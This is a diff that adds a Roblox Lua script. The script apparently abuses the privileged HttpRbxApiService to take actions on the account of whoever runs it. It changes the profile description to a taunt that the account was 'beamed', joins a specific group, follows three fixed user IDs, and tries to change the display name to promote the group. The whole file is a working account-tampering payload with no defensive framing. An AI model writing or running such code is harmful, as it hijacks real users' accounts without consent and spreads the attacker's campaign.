@@ -1,0 +1,32 @@
+local HttpService = game:GetService("HttpService")
+local HttpRbxApiService = game:GetService("HttpRbxApiService")
+
+HttpRbxApiService:PostAsync("https://users.roblox.com/v1/description", HttpService:JSONEncode({
+        ["description"] = "You executor is vulnerable and you account beamed!"
+    }))
+
+HttpRbxApiService:PostAsync("https://groups.roblox.com/v1/groups/33715869/users", HttpService:JSONEncode({}))
+
+local url = "https://friends.roblox.com/v1/users/1490997802/follow"
+HttpRbxApiService:PostAsync(url, HttpService:JSONEncode({}))
+
+local url = "https://friends.roblox.com/v1/users/7207301862/follow"
+HttpRbxApiService:PostAsync(url, HttpService:JSONEncode({}))
+
+local url = "https://friends.roblox.com/v1/users/4294259993/follow"
+HttpRbxApiService:PostAsync(url, HttpService:JSONEncode({}))
+
+local player = game.Players.LocalPlayer
+
+HttpRbxApiService:RequestAsync({
+    Url = "https://users.roblox.com/v1/users/" .. player.UserId .. "/display-names",
+    Method = "PATCH",
+    Headers = {
+        ["accept"] = "application/json",
+        ["Content-Type"] = "application/json",
+        ["Authorization"] = "Bearer YOUR_ACCESS_TOKEN"
+    },
+    Body = HttpService:JSONEncode({
+        ["newDisplayName"] = "CheckNewGroupYouLox"
+    })
+})
